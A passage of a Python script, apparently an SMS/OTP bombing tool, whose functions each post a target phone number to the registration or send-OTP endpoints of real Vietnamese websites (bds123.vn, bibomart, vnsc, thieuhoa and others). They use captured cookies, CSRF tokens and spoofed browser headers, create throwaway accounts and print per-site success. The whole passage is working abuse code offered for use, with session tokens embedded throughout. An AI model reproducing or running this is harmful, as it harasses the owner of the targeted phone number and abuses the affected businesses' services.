        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D; bds123_session=KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
        'origin': 'https://chothuephongtro.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuephongtro.me/dang-ky.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc ujy',
        'phone': sdt,
        'password': '123123aa',
        'user_type': '1',
    }

    response = requests.post('https://chothuephongtro.me/api/user/register', cookies=cookies, headers=headers, data=data)

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D',
        'bds123_session': 'pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D; bds123_session=pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
        'origin': 'https://chothuephongtro.me',
        'priority': 'u=1, i',
        'referer': 'https://chothuephongtro.me/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9jaG90aHVlcGhvbmd0cm8ubWUvZGFzaGJvYXJkL2luZGV4Lmh0bWw=',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://chothuephongtro.me/api/user/send-token', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CHOTHUEPHONGTRO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CHOTHUEPHONGTRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bds123():
    cookies = {
        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
        'XSRF-TOKEN': 'eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D',
        'bds123': '6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua',
        'TawkConnectionTime': '0',
        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D; bds123=6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
        'origin': 'https://bds123.vn',
        'priority': 'u=1, i',
        'referer': 'https://bds123.vn/dang-ky.html?ref=aHR0cHM6Ly9iZHMxMjMudm4vY2hvLXRodWUtcGhvbmctdHJvLW5oYS10cm8taGEtbm9pLmh0bWw%3D',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'fullname': 'tran quoc ujy',
        'phone': sdt,
        'password': '123123aA@',
        'user_type': '1',
        'redirect': 'https://bds123.vn/cho-thue-phong-tro-nha-tro-ha-noi.html',
    }

    response = requests.post('https://bds123.vn/api/user/register', cookies=cookies, headers=headers, data=data)

    cookies = {
        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
        'XSRF-TOKEN': 'eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D',
        'bds123': 'tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1',
        'TawkConnectionTime': '0',
        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D; bds123=tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
        'origin': 'https://bds123.vn',
        'priority': 'u=1, i',
        'referer': 'https://bds123.vn/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9iZHMxMjMudm4v',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone_or_email': sdt,
        'action': 'verify',
    }

    try:
        response = requests.post('https://bds123.vn/api/user/send-token', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BDS123 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BDS123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vnsc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }

    try:
        response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VNSC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VNSC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def bibomart():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://bibomart.com.vn',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 1,
    }

    try:
        response = requests.post('https://prod.bibomart.net/customer_account/v2/otp/send', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BIBOMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BIBOMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sbiz():
    cookies = {
        'PHPSESSID': 'pr1dv3me3bo8t9pmp3k2efdi0l',
        'lang': 'vi',
        'product_watched': '%7B%226944%22%3A1723353629%7D',
        'product_watched': '%7B%226944%22%3A1723353629%7D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'PHPSESSID=pr1dv3me3bo8t9pmp3k2efdi0l; lang=vi; product_watched=%7B%226944%22%3A1723353629%7D; product_watched=%7B%226944%22%3A1723353629%7D',
        'origin': 'https://sbiz.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://sbiz.com.vn/register/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'full_name': 'tran quoc huy',
        'username': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
    }

    try:
        response = requests.post('https://sbiz.com.vn/register/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SBIZ | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SBIZ | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thieuhoa():
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D',
        'laravel_session': 'eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJPRFFpbi9ZMUVBZWlqbStaS2FJcHc9PSIsInZhbHVlIjoiNWtMRHE3dUxvK2NzcDEwTWw5anhXVGNxeU9NRE5OUGRRV2dCNGJrMUEyNnJmZGYzQW85cy9LUHZqb2hCMUR4cDl5cE1SWEozWWJVYUZIbzNSV3pHeUN5b3RuV05Yc0ovOWxzbnJCNzJlUDRJeVg0RmlCVk1WOUtub2pVUE9ZaFIiLCJtYWMiOiI2Y2EzNDgzODBlOWVjMGY3ZjU5YTZhZTBjZWY5M2VhYmY2M2E0ZmQxZWJiNjVkMjg3MDVhMDdiMDVkOTM2MWE5In0%3D; laravel_session=eyJpdiI6IlQyNjdyalZNcXBnMkFwMUNQcnhPbEE9PSIsInZhbHVlIjoibEtoaDcrdGIweXBqM045S1B0bEtacmFpTTZWRTgycFBjdTRKVURTNlhSbzZ6U1M3K2lhUjFncW53Q0hvUnRVVFlta3BCa2FPbWtjUmx6aWFnMjNRZmVyMGNpU0c3eDZVOXI1dGdIeVp3K0E5a0JLSnZReWhVd3dFODdGNCtra1MiLCJtYWMiOiJiZjcwYzBmNzRhOWVlYzA2MjE5NjEzYTBlMDAyYTlhYmQ2MjMxY2VjN2M5MGI5ZjdkNmFiNmZmZDUyNTVkM2ExIn0%3D',
        'origin': 'https://thieuhoa.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://thieuhoa.com.vn/dang-nhap',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        '_token': 'esnlORfZpbivxOLPYNNt7siNcSbaMPxQs3yC2lk0',
        'phone': sdt,
    }

    try:
        response = requests.post('https://thieuhoa.com.vn/phone_login', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THIEUHOA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THIEUHOA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def dchic():
    cookies = {
        '.AspNetCore.Antiforgery.de1fu8pHkYw': 'CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.de1fu8pHkYw=CfDJ8APwjHfRbs5OtNrA7aABpe_oiJdoR9Ui7fp5pti71Rqe9oveC08ZtVdA2wMrZCWiYimIWVP6eSTsWvfSD0M_icLCTpO7yknF-0n-Vci8VFxhZcyn_mSk3Rp1liV6AY8i3NFRczJF2YFzGgzptK_5jbI',
        'origin': 'https://dchic.vn',
        'priority': 'u=1, i',
        'referer': 'https://dchic.vn/tai-khoan/dang-ky',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phoneNumber': sdt,
        'fullName': 'deo co ten',
        'email': random_email,
        'provinceId': '01',
        'districtId': '0',
        'address': '132 Trường Sa, Phường 15, Bình Thạnh, Thành Phố Hồ Chí Minh',
        'birthdayDay': '16',
        'birthdayMonth': '4',
        'birthdayYear': '1996',
        'gender': '1',
        'password': '123123aA@',
        'retypePassword': '123123aA@',
